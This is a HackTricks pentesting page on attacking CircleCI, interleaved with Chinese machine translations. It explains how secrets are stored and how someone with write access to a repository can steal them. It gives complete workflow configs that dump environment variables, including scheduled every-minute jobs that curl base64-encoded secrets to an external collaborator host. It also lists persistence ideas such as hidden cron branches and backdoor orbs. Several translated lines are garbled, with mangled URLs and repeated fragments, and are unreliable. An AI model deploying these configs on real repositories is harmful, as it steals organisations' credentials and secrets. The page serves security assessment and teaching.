# CircleCI

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

## Basic Information

＃＃ 基本信息

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) is a Continuos Integration platform where you ca **define templates** indicating what you want it to do with some code and when to do it. This way you can **automate testing** or **deployments** directly **from your repo master branch** for example.

[** circleci **]（https://circleci.com/docs/2.0/about-circleci/）是一个连续的集成平台，您可以在其中定义模板**指示您想使用某些代码和某些代码和 什么时候做。 这样，您可以**自动化测试**或**部署**例如，从您的回购主部门** **。

## Permissions

**CircleCI** **inherits the permissions** from github and bitbucket related to the **account** that logs in.\

** circleci ** **继承了与登录的**帐户相关的GitHub和Bitbucket的权限**。
In my testing I checked that as long as you have **write permissions over the repo in github**, you are going to be able to **manage its project settings in CircleCI** (set new ssh keys, get project api keys, create new branches with new CircleCI configs...).

在我的测试中，我检查一下，只要您在Github **中写入权限，您就可以在CircleCi **中**管理其项目设置（设置新的SSH键，获取Project api Keys ，使用新的CircleCi Configs创建新分支...）。

However, you need to be a a **repo admin** in order to **convert the repo into a CircleCI project**.

但是，您需要成为一个** repo Admin **，才能**将存储库转换为Circleci项目**。

## Env Variables & Secrets

According to [**the docs**](https://circleci.com/docs/2.0/env-vars/) there are different ways to **load values in environment variables** inside a workflow.

根据[** docs **]（https://circleci.com/docs/2.0/env-vars/），在工作流程中，有不同的方法来**在环境变量中加载值**。

### Built-in env variables

Every container run by CircleCI will always have [**specific env vars defined in the documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) like `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` or `CIRCLE_USERNAME`.

CircleCi运行的每个容器将始终具有文档**]中定义的[**特定的env vars（https://circleci.com/docs/2.0/env-vars/#built--nvars/#built-in-environment-variariables）类似 `，`circle_project_reponame`或`circle_username`。

### Clear text

###清晰文字

You can declare them in clear text inside a **command**:

您可以在**命令**内的清晰文本中声明它们：

```yaml
- run:
    name: "set and echo"
    command: |
        SECRET="A secret"
        echo $SECRET
```

You can declare them in clear text inside the **run environment**:

您可以在**运行环境中的清晰文本中声明它们**：

```yaml
- run:
    name: "set and echo"
    command: echo $SECRET
    environment:
        SECRET: A secret
```

You can declare them in clear text inside the **build-job environment**:

您可以在** build-job环境中的清晰文本中声明它们**：

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
    environment:
        SECRET: A secret
```

You can declare them in clear text inside the **environment of a container**:

您可以在容器**的**环境中的清晰文本中声明它们：

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
                environment:
                    SECRET: A secret
```

### Project Secrets

These are **secrets** that are only going to be **accessible** by the **project** (by **any branch**).\

这些是**秘密**，只能通过** project **访问**（由**任何分支**）。\ \ \
You can see them **declared in** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

您可以在** _https：//app.circleci.com/settings/project/project/github/ \ <org \ _name>/\ <repo \ _name>/emovention-variables_

![](<../.gitbook/assets/image (662) (1) (1).png>)

{% hint style="danger" %}
The "**Import Variables**" functionality allows to **import variables from other projects** to this one.

“ **导入变量**”功能允许**从其他项目的导入变量**到该项目。
{% endhint %}

### Context Secrets

These are secrets that are **org wide**. By **default any repo** is going to be able to **access any secret** stored here:

这些是** org宽**的秘密。 通过**默认，任何回购**将能够**访问存储的任何秘密**：

![](<../.gitbook/assets/image (661).png>)

{% hint style="success" %}

{％提示样式=“成功”％}
However, note that a different group (instead of All members) can be **selected to only give access to the secrets to specific people**.\

但是，请注意，可以选择其他组（而不是所有成员），以便将秘密访问到特定的人**。
This is currently one of the best ways to **increase the security of the secrets**, to not allow everybody to access them but just some people.

目前，这是**提高秘密安全性**安全性的最佳方法之一，不允许所有人访问它们，而只是某些人。
{% endhint %}

## Attacks

### Search Clear Text Secrets

###搜索清晰的文字秘密

If you have **access to the VCS** (like github) check the file `.circleci/config.yml` of **each repo on each branch** and **search** for potential **clear text secrets** stored in there.

如果您有**访问VCS **（例如GitHub），请检查文件`.circleci/config.yml` ** **每个分支上的每个存储库** **和**搜索**是否有潜在的**明确的文本秘密* *存放在那里。

### Secret Env Vars & Context enumeration

### Secret Env vars和上下文枚举

Checking the code you can find **all the secrets names** that are being **used** in each `.circleci/config.yml` file. You can also get the **context names** from those files or check them in the web console: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

检查您可以找到**所有秘密名称**的代码**在每个.circleci/config.yml`文件中使用**。 您还可以从这些文件中获取**上下文名称**或在Web控制台中检查它们：_https：//app.circleci.com/settings/organization/organization/github/ \ <org \ _name>/contects__。

### Exfiltrate Project secrets

{% hint style="warning" %}

{％提示样式=“警告”％}
In order to **exfiltrate ALL** the project and context **SECRETS** you **just** need to have **WRITE** access to **just 1 repo** in the whole github org (_and your account must have access to the contexts but by default everyone can access every context_).

为了**全部**所有**项目和上下文**秘密**您**仅**需要**写** **仅在整个github org中访问**仅1个repo **（_您的帐户） 必须可以访问上下文，但是默认情况下每个人都可以访问每个上下文_）。
{% endhint %}

{% hint style="danger" %}
The "**Import Variables**" functionality allows to **import variables from other projects** to this one. Therefore, an attacker could **import all the project variables from all the repos** and then **exfiltrate all of them together**.

“ **导入变量**”功能允许**从其他项目的导入变量**到该项目。 因此，攻击者可以**从所有存储库中导入所有项目变量**，然后**将所有项目变量一起渗透在一起**。
{% endhint %}

All the project secrets always are set in the env of the jobs, so just calling env and obfuscating it in base64 will exfiltrate the secrets in the **workflows web log console**:

所有项目的秘密始终都设置在工作的Env中，因此仅在Base64中调用Env并将其混为一谈，就会在**工作流中的Web Log Console **中删除秘密：

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - exfil-env
```

If you **don't have access to the web console** but you have **access to the repo** and you know that CircleCI is used, you can just **create a workflow** that is **triggered every minute** and that **exfils the secrets to an external address**:

如果您**无法访问Web控制台**，但是您可以访问repo **，并且您知道使用了CircleCi，则可以**创建一个工作流**，** the every ** the every offer ** 分钟**，那个**将秘密剥夺了外部地址**：

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
  exfil-env-workflow:
    triggers:
      - schedule:
          cron: "* * * * *"
          filters:
            branches:
              only:
                - circleci-project-setup
    jobs:
      - exfil-env
```

### Exfiltrate Context Secrets

You need to **specify the context name** (this will also exfiltrate the project secrets):

您需要**指定上下文名称**（这也将使项目秘密渗透）：

```yaml
```

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - exfil-env:
          context: Test-Context
```

If you **don't have access to the web console** but you have **access to the repo** and you know that CircleCI is used, you can just **modify a workflow** that is **triggered every minute** and that **exfils the secrets to an external address**:

如果您**无法访问Web控制台**，但是您可以访问repo **，并且您知道使用了CircleCi，则可以**修改工作流** **均为**触发的工作流程** 分钟**，那个**将秘密剥夺了外部地址**：

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
  exfil-env-workflow:
    triggers:
      - schedule:
          cron: "* * * * *"
          filters:
            branches:
              only:
                - circleci-project-setup
    jobs:
      - exfil-env:
          context: Test-Context
```

{% hint style="warning" %}

{％提示样式=“警告”％}
Just creating a new `.circleci/config.yml` in a repo **isn't enough to trigger a circleci build**. You need to **enable it as a project in the circleci console**.

仅在repo **中创建一个新的`.circleci/config.yml`不足以触发CircleCi构建**。 您需要**在CircleCi控制台**中启用它。
{% endhint %}

### Escape to Cloud

**CircleCI** gives you the option to run **your builds in their machines or in your own**.\

** CircleCi **为您提供了运行**在其机器或您自己的机器中的构建的选项。\ \ \ \ \
By default their machines are located in GCP, and you initially won't be able to fid anything relevant. However, if a victim is running the tasks in **their own machines (potentially, in a cloud env)**, you might find a **cloud metadata endpoint with interesting information on it**.

默认情况下，他们的机器位于GCP中，最初您将无法提供任何相关的内容。 但是，如果受害者在**自己的机器中运行任务（可能是在云环境中）**，您可能会发现一个**云元数据端点，上面有有趣的信息**。

Notice that in the previous examples it was launched everything inside a docker container, but you can also **ask to launch a VM machine** (which may have different cloud permissions):

请注意，在前面的示例中，它是在Docker容器中启动的，但是您也可以**要求启动VM机器**（可能具有不同的云权限）：

```yaml
jobs:
  exfil-env:
    #docker:
    #  - image: cimg/base:stable
    machine:
      image: ubuntu-2004:current
```

Or even a docker container with access to a remote docker service:

甚至具有访问远程Docker服务的Docker容器：

```yaml
jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - setup_remote_docker:
          version: 19.03.13
```

### Persistence

###持久性

* It's possible to **create** **user tokens in CircleCI** to access the API endpoints with the users access.

*可以**创建** **在CircleCi **中使用用户令牌，以访问用户访问的API端点。
  * _https://app.circleci.com/settings/user/tokens_
* It's possible to **create projects tokens** to access the project with the permissions given to the token.

*可以**创建项目代币**，以访问该项目的权限。
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* It's possible to **add SSH keys** to the projects.

*可以**将SSH键**添加到项目中。
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_

* _https：//app.circleci.com/settings/project/project/github/ \ <org>/\ <repo>/ssh_
* It's possible to **create a cron job in hidden branch** in an unexpected project that is **leaking** all the **context env** vars everyday.

*可以在一个意外的项目中**在隐藏的分支中**创建一个cron作业，该项目每天都在**泄漏** **所有** context ** vars。
  * Or even create in a branch / modify a known job that will **leak** all context and **projects secrets** everyday.

*甚至在分支机构中创建 /修改已知的作业，该作业将**泄漏**所有上下文，并且**每天都在项目秘密**。
* If you are a github owner you can **allow unverified orbs** and configure one in a job as **backdoor**

*如果您是GitHub所有者，则可以**允许未经验证的球**并在作业中配置为** Backdoor **
* You can find a **command injection vulnerability** in some task and **inject commands** via a **secret** modifying its value

*您可以在某些任务中找到**命令注入漏洞**，并且**通过**秘密**修改其值

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
